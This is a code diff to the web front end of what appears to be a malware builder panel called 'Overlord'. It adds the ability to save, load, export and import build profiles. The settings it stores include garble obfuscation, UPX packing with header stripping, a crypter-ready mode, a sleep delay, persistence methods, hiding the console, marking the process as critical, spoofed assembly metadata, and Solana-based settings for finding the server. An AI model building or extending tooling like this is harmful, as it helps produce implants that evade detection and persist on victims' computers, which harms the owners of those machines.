@@ -17,6 +17,14 @@ const rawServerListCheckbox = document.getElementById("raw-server-list");
 const serverUrlInput = document.getElementById("server-url");
 const solMemoCheckbox = document.getElementById("sol-memo");
 const solSettings = document.getElementById("sol-settings");
+const profileSelect = document.getElementById("build-profile-select");
+const profileNameInput = document.getElementById("build-profile-name");
+const profileSaveBtn = document.getElementById("profile-save-btn");
+const profileLoadBtn = document.getElementById("profile-load-btn");
+const profileDeleteBtn = document.getElementById("profile-delete-btn");
+const profileExportBtn = document.getElementById("profile-export-btn");
+const profileImportBtn = document.getElementById("profile-import-btn");
+const profileImportFile = document.getElementById("profile-import-file");
 
 let currentServerVersion = null;
 let currentUserRole = null;
@@ -87,42 +95,129 @@ function updateWindowsSectionVisibility() {
 }
 
 const BUILD_SETTINGS_KEY = "overlord_build_settings";
+const PROFILE_EXPORT_MAGIC = "overlord-build-profile";
+
+let buildProfiles = [];
+
+function collectFormSettings() {
+  return {
+    platforms: Array.from(document.querySelectorAll('input[name="platform"]')).map((el) => ({ value: el.value, checked: el.checked })),
+    serverUrl: document.getElementById("server-url")?.value ?? "",
+    rawServerList: document.getElementById("raw-server-list")?.checked ?? false,
+    solMemo: document.getElementById("sol-memo")?.checked ?? false,
+    solAddress: document.getElementById("sol-address")?.value ?? "",
+    solRpcEndpoints: document.getElementById("sol-rpc-endpoints")?.value ?? "",
+    outputName: document.getElementById("output-name")?.value ?? "",
+    iosBundleId: document.getElementById("ios-bundle-id")?.value ?? "",
+    mutex: document.getElementById("mutex")?.value ?? "",
+    disableMutex: document.querySelector('input[name="disable-mutex"]')?.checked ?? false,
+    stripDebug: document.querySelector('input[name="strip-debug"]')?.checked ?? true,
+    disableCgo: document.querySelector('input[name="disable-cgo"]')?.checked ?? false,
+    noPrinting: document.querySelector('input[name="no-printing"]')?.checked ?? false,
+    obfuscate: document.querySelector('input[name="obfuscate"]')?.checked ?? false,
+    garbleLiterals: document.querySelector('input[name="garble-literals"]')?.checked ?? false,
+    garbleTiny: document.querySelector('input[name="garble-tiny"]')?.checked ?? false,
+    garbleSeed: document.getElementById("garble-seed")?.value ?? "",
+    enableUpx: document.querySelector('input[name="enable-upx"]')?.checked ?? false,
+    upxStripHeaders: document.querySelector('input[name="upx-strip-headers"]')?.checked ?? false,
+    sleepSeconds: document.getElementById("sleep-seconds")?.value ?? "0",
+    enablePersistence: document.querySelector('input[name="enable-persistence"]')?.checked ?? false,
+    persistenceMethods: Array.from(document.querySelectorAll('input[name="persistence-method"]:checked')).map((el) => el.value),
+    startupName: document.getElementById("startup-name")?.value ?? "",
+    hideConsole: document.querySelector('input[name="hide-console"]')?.checked ?? false,
+    requireAdmin: document.querySelector('input[name="require-admin"]')?.checked ?? false,
+    criticalProcess: document.querySelector('input[name="critical-process"]')?.checked ?? false,
+    assemblyTitle: document.getElementById("assembly-title")?.value ?? "",
+    assemblyProduct: document.getElementById("assembly-product")?.value ?? "",
+    assemblyCompany: document.getElementById("assembly-company")?.value ?? "",
+    assemblyVersion: document.getElementById("assembly-version")?.value ?? "",
+    assemblyCopyright: document.getElementById("assembly-copyright")?.value ?? "",
+    outputExtension: document.getElementById("output-extension")?.value ?? ".exe",
+    cryptableMode: document.getElementById("cryptable-mode")?.checked ?? false,
+  };
+}
+
+function applyFormSettings(settings) {
+  if (!settings || typeof settings !== "object") return;
+
+  const setVal = (id, val) => {
+    const el = document.getElementById(id);
+    if (el && val !== undefined && val !== null) el.value = String(val);
+  };
+  const setCb = (sel, val) => {
+    const el = document.querySelector(sel);
+    if (el && val !== undefined) el.checked = !!val;
+  };
+
+  if (Array.isArray(settings.platforms)) {
+    settings.platforms.forEach(({ value, checked }) => {
+      const el = document.querySelector(`input[name="platform"][value="${value}"]`);
+      if (el) el.checked = !!checked;
+    });
+  }
+  if (settings.serverUrl !== undefined) setVal("server-url", settings.serverUrl);
+  if (settings.rawServerList !== undefined) setCb("#raw-server-list", settings.rawServerList);
+  if (settings.solMemo !== undefined) setCb("#sol-memo", settings.solMemo);
+  if (settings.solAddress !== undefined) setVal("sol-address", settings.solAddress);
+  if (settings.solRpcEndpoints !== undefined) setVal("sol-rpc-endpoints", settings.solRpcEndpoints);
+  if (settings.outputName !== undefined) setVal("output-name", settings.outputName);
+  if (settings.iosBundleId !== undefined) setVal("ios-bundle-id", settings.iosBundleId);
+  if (settings.mutex !== undefined) setVal("mutex", settings.mutex);
+  if (settings.disableMutex !== undefined) setCb('input[name="disable-mutex"]', settings.disableMutex);
+  if (settings.stripDebug !== undefined) setCb('input[name="strip-debug"]', settings.stripDebug);
+  if (settings.disableCgo !== undefined) setCb('input[name="disable-cgo"]', settings.disableCgo);
+  if (settings.noPrinting !== undefined) setCb('input[name="no-printing"]', settings.noPrinting);
+  if (settings.obfuscate !== undefined) setCb('input[name="obfuscate"]', settings.obfuscate);
+  if (settings.garbleLiterals !== undefined) setCb('input[name="garble-literals"]', settings.garbleLiterals);
+  if (settings.garbleTiny !== undefined) setCb('input[name="garble-tiny"]', settings.garbleTiny);
+  if (settings.garbleSeed !== undefined) setVal("garble-seed", settings.garbleSeed);
+  if (settings.enableUpx !== undefined) setCb('input[name="enable-upx"]', settings.enableUpx);
+  if (settings.upxStripHeaders !== undefined) setCb('input[name="upx-strip-headers"]', settings.upxStripHeaders);
+  if (settings.sleepSeconds !== undefined) setVal("sleep-seconds", settings.sleepSeconds);
+  if (settings.enablePersistence !== undefined) setCb('input[name="enable-persistence"]', settings.enablePersistence);
+  if (Array.isArray(settings.persistenceMethods)) {
+    document.querySelectorAll('input[name="persistence-method"]').forEach((el) => {
+      el.checked = settings.persistenceMethods.includes(el.value);
+    });
+  }
+  if (settings.startupName !== undefined) setVal("startup-name", settings.startupName);
+  if (settings.hideConsole !== undefined) setCb('input[name="hide-console"]', settings.hideConsole);
+  if (settings.requireAdmin !== undefined) setCb('input[name="require-admin"]', settings.requireAdmin);
+  if (settings.criticalProcess !== undefined) setCb('input[name="critical-process"]', settings.criticalProcess);
+  if (settings.assemblyTitle !== undefined) setVal("assembly-title", settings.assemblyTitle);
+  if (settings.assemblyProduct !== undefined) setVal("assembly-product", settings.assemblyProduct);
+  if (settings.assemblyCompany !== undefined) setVal("assembly-company", settings.assemblyCompany);
+  if (settings.assemblyVersion !== undefined) setVal("assembly-version", settings.assemblyVersion);
+  if (settings.assemblyCopyright !== undefined) setVal("assembly-copyright", settings.assemblyCopyright);
+  if (settings.outputExtension !== undefined) setVal("output-extension", settings.outputExtension);
+  if (settings.cryptableMode !== undefined) setCb("#cryptable-mode", settings.cryptableMode);
+
+  const restoredObfuscate = document.querySelector('input[name="obfuscate"]');
+  const garbleContainer = document.getElementById("garble-settings-container");
+  if (restoredObfuscate && garbleContainer) {
+    garbleContainer.classList.toggle("hidden", !restoredObfuscate.checked);
+  }
+  const restoredUpx = document.querySelector('input[name="enable-upx"]');
+  const upxContainer = document.getElementById("upx-settings-container");
+  if (restoredUpx && upxContainer) {
+    upxContainer.classList.toggle("hidden", !restoredUpx.checked);
+  }
+
+  updateWindowsSectionVisibility();
+  updateIosSectionVisibility();
+  updatePersistenceSettingsVisibility();
+  if (solMemoCheckbox && solSettings) {
+    solSettings.classList.toggle("hidden", !solMemoCheckbox.checked);
+  }
+  if (serverUrlInput && rawServerListCheckbox) {
+    serverUrlInput.placeholder = getDefaultServerUrlPlaceholder(rawServerListCheckbox.checked);
+  }
+  applyCryptableMode(document.getElementById("cryptable-mode")?.checked || false);
+}
 
 function saveFormSettings() {
   try {
-    const settings = {
-      platforms: Array.from(document.querySelectorAll('input[name="platform"]')).map((el) => ({ value: el.value, checked: el.checked })),
-      serverUrl: document.getElementById("server-url")?.value ?? "",
-      rawServerList: document.getElementById("raw-server-list")?.checked ?? false,
-      solMemo: document.getElementById("sol-memo")?.checked ?? false,
-      solAddress: document.getElementById("sol-address")?.value ?? "",
-      solRpcEndpoints: document.getElementById("sol-rpc-endpoints")?.value ?? "",
-      mutex: document.getElementById("mutex")?.value ?? "",
-      disableMutex: document.querySelector('input[name="disable-mutex"]')?.checked ?? false,
-      stripDebug: document.querySelector('input[name="strip-debug"]')?.checked ?? true,
-      disableCgo: document.querySelector('input[name="disable-cgo"]')?.checked ?? false,
-      noPrinting: document.querySelector('input[name="no-printing"]')?.checked ?? false,
-      obfuscate: document.querySelector('input[name="obfuscate"]')?.checked ?? false,
-      garbleLiterals: document.querySelector('input[name="garble-literals"]')?.checked ?? false,
-      garbleTiny: document.querySelector('input[name="garble-tiny"]')?.checked ?? false,
-      garbleSeed: document.getElementById("garble-seed")?.value ?? "",
-      enableUpx: document.querySelector('input[name="enable-upx"]')?.checked ?? false,
-      upxStripHeaders: document.querySelector('input[name="upx-strip-headers"]')?.checked ?? false,
-      sleepSeconds: document.getElementById("sleep-seconds")?.value ?? "0",
-      enablePersistence: document.querySelector('input[name="enable-persistence"]')?.checked ?? false,
-      persistenceMethods: Array.from(document.querySelectorAll('input[name="persistence-method"]:checked')).map((el) => el.value),
-      startupName: document.getElementById("startup-name")?.value ?? "",
-      hideConsole: document.querySelector('input[name="hide-console"]')?.checked ?? false,
-      requireAdmin: document.querySelector('input[name="require-admin"]')?.checked ?? false,
-      criticalProcess: document.querySelector('input[name="critical-process"]')?.checked ?? false,
-      assemblyTitle: document.getElementById("assembly-title")?.value ?? "",
-      assemblyProduct: document.getElementById("assembly-product")?.value ?? "",
-      assemblyCompany: document.getElementById("assembly-company")?.value ?? "",
-      assemblyVersion: document.getElementById("assembly-version")?.value ?? "",
-      assemblyCopyright: document.getElementById("assembly-copyright")?.value ?? "",
-      outputExtension: document.getElementById("output-extension")?.value ?? ".exe",
-      cryptableMode: document.getElementById("cryptable-mode")?.checked ?? false,
-    };
+    const settings = collectFormSettings();
     localStorage.setItem(BUILD_SETTINGS_KEY, JSON.stringify(settings));
   } catch (err) {
     console.error("Failed to save form settings:", err);
@@ -133,65 +228,136 @@ function restoreFormSettings() {
   try {
     const raw = localStorage.getItem(BUILD_SETTINGS_KEY);
     if (!raw) return;
-    const s = JSON.parse(raw);
-
-    const setVal = (id, val) => { const el = document.getElementById(id); if (el && val !== undefined) el.value = val; };
-    const setCb = (sel, val) => { const el = document.querySelector(sel); if (el && val !== undefined) el.checked = val; };
-
-    if (Array.isArray(s.platforms)) {
-      s.platforms.forEach(({ value, checked }) => {
-        const el = document.querySelector(`input[name="platform"][value="${value}"]`);
-        if (el) el.checked = checked;
-      });
-    }
-    if (s.serverUrl !== undefined) setVal("server-url", s.serverUrl);
-    if (s.rawServerList !== undefined) setCb("#raw-server-list", s.rawServerList);
-    if (s.solMemo !== undefined) setCb("#sol-memo", s.solMemo);
-    if (s.solAddress !== undefined) setVal("sol-address", s.solAddress);
-    if (s.solRpcEndpoints !== undefined) setVal("sol-rpc-endpoints", s.solRpcEndpoints);
-    if (s.mutex !== undefined) setVal("mutex", s.mutex);
-    if (s.disableMutex !== undefined) setCb('input[name="disable-mutex"]', s.disableMutex);
-    if (s.stripDebug !== undefined) setCb('input[name="strip-debug"]', s.stripDebug);
-    if (s.disableCgo !== undefined) setCb('input[name="disable-cgo"]', s.disableCgo);
-    if (s.noPrinting !== undefined) setCb('input[name="no-printing"]', s.noPrinting);
-    if (s.obfuscate !== undefined) setCb('input[name="obfuscate"]', s.obfuscate);
-    if (s.garbleLiterals !== undefined) setCb('input[name="garble-literals"]', s.garbleLiterals);
-    if (s.garbleTiny !== undefined) setCb('input[name="garble-tiny"]', s.garbleTiny);
-    if (s.garbleSeed !== undefined) setVal("garble-seed", s.garbleSeed);
-    if (s.enableUpx !== undefined) setCb('input[name="enable-upx"]', s.enableUpx);
-    if (s.upxStripHeaders !== undefined) setCb('input[name="upx-strip-headers"]', s.upxStripHeaders);
-    if (s.sleepSeconds !== undefined) setVal("sleep-seconds", s.sleepSeconds);
-    if (s.enablePersistence !== undefined) setCb('input[name="enable-persistence"]', s.enablePersistence);
-    if (Array.isArray(s.persistenceMethods)) {
-      document.querySelectorAll('input[name="persistence-method"]').forEach((el) => {
-        el.checked = s.persistenceMethods.includes(el.value);
-      });
-    }
-    if (s.startupName !== undefined) setVal("startup-name", s.startupName);
-    if (s.hideConsole !== undefined) setCb('input[name="hide-console"]', s.hideConsole);
-    if (s.requireAdmin !== undefined) setCb('input[name="require-admin"]', s.requireAdmin);
-    if (s.criticalProcess !== undefined) setCb('input[name="critical-process"]', s.criticalProcess);
-    if (s.assemblyTitle !== undefined) setVal("assembly-title", s.assemblyTitle);
-    if (s.assemblyProduct !== undefined) setVal("assembly-product", s.assemblyProduct);
-    if (s.assemblyCompany !== undefined) setVal("assembly-company", s.assemblyCompany);
-    if (s.assemblyVersion !== undefined) setVal("assembly-version", s.assemblyVersion);
-    if (s.assemblyCopyright !== undefined) setVal("assembly-copyright", s.assemblyCopyright);
-    if (s.outputExtension !== undefined) setVal("output-extension", s.outputExtension);
-    if (s.cryptableMode !== undefined) setCb("#cryptable-mode", s.cryptableMode);
-
-    const restoredObfuscate = document.querySelector('input[name="obfuscate"]');
-    const garbleContainer = document.getElementById("garble-settings-container");
-    if (restoredObfuscate && garbleContainer) {
-      garbleContainer.classList.toggle("hidden", !restoredObfuscate.checked);
-    }
-    const restoredUpx = document.querySelector('input[name="enable-upx"]');
-    const upxContainer = document.getElementById("upx-settings-container");
-    if (restoredUpx && upxContainer) {
-      upxContainer.classList.toggle("hidden", !restoredUpx.checked);
-    }
+    const settings = JSON.parse(raw);
+    applyFormSettings(settings);
   } catch (err) {
     console.error("Failed to restore form settings:", err);
   }
+}
+
+function sanitizeProfileName(name) {
+  if (typeof name !== "string") return "";
+  const trimmed = name.trim();
+  if (!trimmed || trimmed.length > 64) return "";
+  if (!/^[A-Za-z0-9 _.-]+$/.test(trimmed)) return "";
+  return trimmed;
+}
+
+function renderProfileOptions(selectedName = "") {
+  if (!profileSelect) return;
+  profileSelect.innerHTML = "";
+
+  const placeholder = document.createElement("option");
+  placeholder.value = "";
+  placeholder.textContent = "Select a saved profile...";
+  profileSelect.appendChild(placeholder);
+
+  buildProfiles.forEach((profile) => {
+    const option = document.createElement("option");
+    option.value = profile.name;
+    option.textContent = profile.name;
+    if (selectedName && selectedName === profile.name) option.selected = true;
+    profileSelect.appendChild(option);
+  });
+}
+
+function getSelectedProfile() {
+  if (!profileSelect || !profileSelect.value) return null;
+  return buildProfiles.find((profile) => profile.name === profileSelect.value) || null;
+}
+
+async function loadBuildProfiles(selectedName = "") {
+  try {
+    const res = await fetch("/api/build/profiles", { credentials: "include" });
+    if (!res.ok) {
+      buildProfiles = [];
+      renderProfileOptions();
+      return;
+    }
+    const data = await res.json();
+    buildProfiles = Array.isArray(data?.profiles) ? data.profiles : [];
+    renderProfileOptions(selectedName || profileSelect?.value || "");
+  } catch (err) {
+    console.error("Failed to load build profiles:", err);
+    buildProfiles = [];
+    renderProfileOptions();
+  }
+}
+
+async function saveCurrentProfile() {
+  const inputName = profileNameInput?.value || "";
+  const selectedName = profileSelect?.value || "";
+  const profileName = sanitizeProfileName(inputName || selectedName);
+  if (!profileName) {
+    alert("Enter a valid profile name (1-64 chars; letters, numbers, spaces, . _ -)");
+    profileNameInput?.focus();
+    return;
+  }
+
+  const config = collectFormSettings();
+
+  const res = await fetch("/api/build/profiles", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    credentials: "include",
+    body: JSON.stringify({ name: profileName, config }),
+  });
+
+  if (!res.ok) {
+    const data = await res.json().catch(() => ({}));
+    throw new Error(data.error || "Failed to save profile");
+  }
+
+  if (profileNameInput) profileNameInput.value = profileName;
+  await loadBuildProfiles(profileName);
+}
+
+function exportProfileToFile(name, config) {
+  const payload = {
+    type: PROFILE_EXPORT_MAGIC,
+    version: 1,
+    name,
+    exportedAt: Date.now(),
+    config,
+  };
+  const json = JSON.stringify(payload, null, 2);
+  const blob = new Blob([json], { type: "application/json" });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
+  const safeName = (name || "build-profile").replace(/[^A-Za-z0-9._-]/g, "_");
+  a.href = url;
+  a.download = `${safeName}.json`;
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+  URL.revokeObjectURL(url);
+}
+
+async function importProfileFromFile(file) {
+  const text = await file.text();
+  let parsed;
+  try {
+    parsed = JSON.parse(text);
+  } catch {
+    throw new Error("Invalid JSON file");
+  }
+
+  const fallbackName = file.name.replace(/\.json$/i, "");
+  const importedName = sanitizeProfileName(parsed?.name || fallbackName);
+  if (!importedName) {
+    throw new Error("Invalid profile name in imported file");
+  }
+
+  const importedConfig = parsed?.config;
+  if (!importedConfig || typeof importedConfig !== "object" || Array.isArray(importedConfig)) {
+    throw new Error("Imported profile is missing a valid config object");
+  }
+
+  applyFormSettings(importedConfig);
+  saveFormSettings();
+
+  if (profileNameInput) profileNameInput.value = importedName;
+  await saveCurrentProfile();
 }
 
 const CRYPTABLE_DISABLE_TARGETS = [
@@ -999,10 +1165,16 @@ async function init() {
       buildBtn.disabled = true;
       buildBtn.innerHTML =
         '<i class="fa-solid fa-lock"></i> <span>Build requires permission</span>';
+      if (profileSaveBtn) profileSaveBtn.disabled = true;
+      if (profileLoadBtn) profileLoadBtn.disabled = true;
+      if (profileDeleteBtn) profileDeleteBtn.disabled = true;
+      if (profileExportBtn) profileExportBtn.disabled = true;
+      if (profileImportBtn) profileImportBtn.disabled = true;
     }
 
     await loadServerVersion();
     await loadSavedBuilds();
+    await loadBuildProfiles();
 
     const toggleAllBuildsBtn = document.getElementById("toggle-all-builds-btn");
     const toggleAllBuildsLabel = document.getElementById("toggle-all-builds-label");
@@ -1035,6 +1207,95 @@ if (logoutBtn && !logoutBtn.dataset.boundLogout) {
       console.error("Logout error:", err);
     }
     window.location.href = "/";
+  });
+}
+
+if (profileSelect) {
+  profileSelect.addEventListener("change", () => {
+    const profile = getSelectedProfile();
+    if (profileNameInput) {
+      profileNameInput.value = profile?.name || "";
+    }
+  });
+}
+
+if (profileSaveBtn) {
+  profileSaveBtn.addEventListener("click", async () => {
+    try {
+      await saveCurrentProfile();
+      alert("Profile saved.");
+    } catch (err) {
+      alert(err?.message || "Failed to save profile");
+    }
+  });
+}
+
+if (profileLoadBtn) {
+  profileLoadBtn.addEventListener("click", () => {
+    const profile = getSelectedProfile();
+    if (!profile) {
+      alert("Select a profile to load.");
+      return;
+    }
+    applyFormSettings(profile.config || {});
+    saveFormSettings();
+    if (profileNameInput) profileNameInput.value = profile.name;
+    alert(`Loaded profile: ${profile.name}`);
+  });
+}
+
+if (profileDeleteBtn) {
+  profileDeleteBtn.addEventListener("click", async () => {
+    const profile = getSelectedProfile();
+    if (!profile) {
+      alert("Select a profile to delete.");
+      return;
+    }
+    if (!confirm(`Delete profile \"${profile.name}\"?`)) {
+      return;
+    }
+    try {
+      const res = await fetch(`/api/build/profiles/${encodeURIComponent(profile.name)}`, {
+        method: "DELETE",
+        credentials: "include",
+      });
+      if (!res.ok) {
+        const data = await res.json().catch(() => ({}));
+        throw new Error(data.error || "Failed to delete profile");
+      }
+      await loadBuildProfiles();
+      if (profileNameInput) profileNameInput.value = "";
+      alert("Profile deleted.");
+    } catch (err) {
+      alert(err?.message || "Failed to delete profile");
+    }
+  });
+}
+
+if (profileExportBtn) {
+  profileExportBtn.addEventListener("click", () => {
+    const profile = getSelectedProfile();
+    if (profile) {
+      exportProfileToFile(profile.name, profile.config || {});
+      return;
+    }
+    const fallbackName = sanitizeProfileName(profileNameInput?.value || "") || "current-build-profile";
+    exportProfileToFile(fallbackName, collectFormSettings());
+  });
+}
+
+if (profileImportBtn && profileImportFile) {
+  profileImportBtn.addEventListener("click", () => profileImportFile.click());
+  profileImportFile.addEventListener("change", async () => {
+    const file = profileImportFile.files?.[0];
+    profileImportFile.value = "";
+    if (!file) return;
+    try {
+      await importProfileFromFile(file);
+      alert("Profile imported and saved.");
+    } catch (err) {
+      alert(err?.message || "Failed to import profile");
+    }
   });
 }
 
